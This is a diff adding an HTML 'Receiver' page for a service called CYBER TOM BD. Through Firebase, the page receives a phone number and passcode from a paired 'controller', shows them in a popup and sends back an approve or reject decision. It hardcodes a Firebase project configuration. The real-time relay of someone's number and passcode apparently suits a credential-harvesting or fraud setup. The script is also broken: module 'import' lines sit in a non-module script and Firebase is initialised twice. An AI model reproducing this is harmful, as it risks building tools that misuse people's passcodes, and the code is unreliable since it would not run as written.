@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CYBER TOM BD - Receiver</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+    body {
+      min-height: 100vh;
+      background: #05070d;
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .rgb-wrapper {
+      position: relative;
+      width: 100%;
+      max-width: 400px;
+      border-radius: 22px;
+      padding: 3px;
+      background: linear-gradient(45deg, #00e5ff, #ff0055, #00ff66, #00e5ff);
+      background-size: 400%;
+      animation: rgbGlow 8s linear infinite;
+      box-shadow: 0 0 25px rgba(255, 0, 85, 0.35);
+    }
+    @keyframes rgbGlow {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .card {
+      background: #0d121f;
+      border-radius: 20px;
+      padding: 28px 22px;
+      width: 100%;
+      text-align: center;
+    }
+    h1 {
+      color: #00e5ff;
+      font-size: 24px;
+      letter-spacing: 2px;
+      text-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
+    }
+    .subtitle {
+      color: #8795a9;
+      font-size: 13px;
+      margin-top: 6px;
+      margin-bottom: 20px;
+      letter-spacing: 1px;
+    }
+    .code-box {
+      background: #070b14;
+      border: 1px dashed #00e5ff;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 18px;
+    }
+    .code-label {
+      font-size: 11px;
+      color: #8795a9;
+      letter-spacing: 1px;
+      margin-bottom: 6px;
+    }
+    .pair-code {
+      font-size: 26px;
+      font-weight: bold;
+      color: #00ff99;
+      letter-spacing: 3px;
+      text-shadow: 0 0 10px rgba(0, 255, 153, 0.4);
+    }
+    .status-badge {
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: bold;
+      background: #141c2f;
+      border: 1px solid #263449;
+      color: #ff9800;
+    }
+    .status-badge.connected {
+      color: #00e5a0;
+      border-color: #00e5a0;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 11px;
+      color: #526177;
+    }
+
+    .popup-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(5, 7, 13, 0.88);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      z-index: 999;
+    }
+    .popup-overlay.hidden { display: none; }
+    .popup-card {
+      width: 100%;
+      max-width: 360px;
+      background: #111829;
+      border: 2px solid #00e5ff;
+      border-radius: 18px;
+      padding: 24px 20px;
+      text-align: center;
+      box-shadow: 0 0 30px rgba(0, 229, 255, 0.4);
+    }
+    .popup-title {
+      color: #00e5ff;
+      font-size: 18px;
+      font-weight: bold;
+      letter-spacing: 1px;
+      margin-bottom: 12px;
+    }
+    .popup-details {
+      background: #070b14;
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 18px;
+      font-size: 14px;
+      color: #d1d9e6;
+      line-height: 1.6;
+    }
+    .popup-actions {
+      display: flex;
+      gap: 12px;
+    }
+    .popup-actions button {
+      flex: 1;
+      padding: 13px;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .btn-ok {
+      background: #00e5a0;
+      color: #05070d;
+      box-shadow: 0 0 12px rgba(0, 229, 160, 0.4);
+    }
+    .btn-reject {
+      background: #ff4262;
+      color: #ffffff;
+      box-shadow: 0 0 12px rgba(255, 66, 98, 0.4);
+    }
+  </style>
+</head>
+<body>
+
+<div class="rgb-wrapper">
+  <div class="card">
+    <h1>CYBER TOM BD</h1>
+    <div class="subtitle">RECEIVER SERVICE</div>
+
+    <div class="code-box">
+      <div class="code-label">YOUR PAIRING CODE</div>
+      <div id="pairCodeDisplay" class="pair-code">------</div>
+    </div>
+
+    <div id="connStatus" class="status-badge">INITIALIZING SERVICE...</div>
+
+    <div class="footer">KEEP APP OPEN FOR REAL-TIME REQUESTS</div>
+  </div>
+</div>
+
+<div id="requestPopup" class="popup-overlay hidden">
+  <div class="popup-card">
+    <div class="popup-title">CYBER TOM BD • REQUEST</div>
+    <div class="popup-details" id="popupDetails">
+      Incoming Authorization Request
+    </div>
+    <div class="popup-actions">
+      <button class="btn-ok" onclick="respondToRequest('APPROVED')">OK</button>
+      <button class="btn-reject" onclick="respondToRequest('REJECTED')">REJECT</button>
+    </div>
+  </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+
+<script>
+  // Import the functions you need from the SDKs you need
+import { initializeApp } from "firebase/app";
+import { getAnalytics } from "firebase/analytics";
+// TODO: Add SDKs for Firebase products that you want to use
+// https://firebase.google.com/docs/web/setup#available-libraries
+
+// Your web app's Firebase configuration
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyBb4wufoCuuhXpyMFUCt0N9UKkTSuYSKJA",
+  authDomain: "bd-tom-caiver.firebaseapp.com",
+  databaseURL: "https://bd-tom-caiver-default-rtdb.firebaseio.com",
+  projectId: "bd-tom-caiver",
+  storageBucket: "bd-tom-caiver.firebasestorage.app",
+  messagingSenderId: "760577532792",
+  appId: "1:760577532792:web:14229c5c5766b300265e8d",
+  measurementId: "G-Y7F832DHRS"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const analytics = getAnalytics(app);
+  firebase.initializeApp(firebaseConfig);
+  const auth = firebase.auth();
+  const db = firebase.database();
+
+  let currentUid = null;
+  let pairCode = generatePairCode();
+  let lastHandledTimestamp = 0;
+
+  function generatePairCode() {
+    const num = Math.floor(1000 + Math.random() * 9000);
+    return "TOM-" + num;
+  }
+
+  auth.signInAnonymously()
+    .then((cred) => {
+      currentUid = cred.user.uid;
+      registerPairingRoom();
+    })
+    .catch((err) => {
+      document.getElementById("connStatus").textContent = "AUTH ERROR: " + err.message;
+    });
+
+  function registerPairingRoom() {
+    const pairRef = db.ref("pairings/" + pairCode);
+
+    Promise.all([
+      pairRef.child("receiverUid").set(currentUid),
+      pairRef.child("createdAt").set(firebase.database.ServerValue.TIMESTAMP)
+    ])
+    .then(() => {
+      document.getElementById("pairCodeDisplay").textContent = pairCode;
+      document.getElementById("connStatus").textContent = "WAITING FOR CONTROLLER...";
+      listenForController(pairRef);
+      listenForRequests(pairRef);
+    })
+    .catch((err) => {
+      document.getElementById("connStatus").textContent = "INIT ERROR: " + err.message;
+    });
+  }
+
+  function listenForController(pairRef) {
+    pairRef.child("controllerUid").on("value", (snapshot) => {
+      if (snapshot.exists()) {
+        const statusEl = document.getElementById("connStatus");
+        statusEl.textContent = "CONNECTED • SECURE LINK ACTIVE";
+        statusEl.classList.add("connected");
+      }
+    });
+  }
+
+  function listenForRequests(pairRef) {
+    pairRef.child("request").on("value", (snapshot) => {
+      const req = snapshot.val();
+      if (!req || !req.timestamp || req.timestamp === lastHandledTimestamp) return;
+
+      lastHandledTimestamp = req.timestamp;
+      const detailsEl = document.getElementById("popupDetails");
+      detailsEl.innerHTML = `
+        <strong>ID / Number:</strong> ${escapeHtml(req.phone)}<br>
+        <strong>Passcode:</strong> ${escapeHtml(req.passcode)}
+      `;
+      document.getElementById("requestPopup").classList.remove("hidden");
+    });
+  }
+
+  function respondToRequest(decision) {
+    document.getElementById("requestPopup").classList.add("hidden");
+    const pairRef = db.ref("pairings/" + pairCode);
+
+    pairRef.child("approval").set({
+      status: decision,
+      timestamp: firebase.database.ServerValue.TIMESTAMP
+    })
+    .then(() => {
+      const statusEl = document.getElementById("connStatus");
+      statusEl.textContent = "LAST ACTION: " + decision;
+    });
+  }
+
+  function escapeHtml(str) {
+    return String(str).replace(/[&<>"']/g, (m) => ({
+      '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+    }[m]));
+  }
+</script>
+</body>
+      </html>
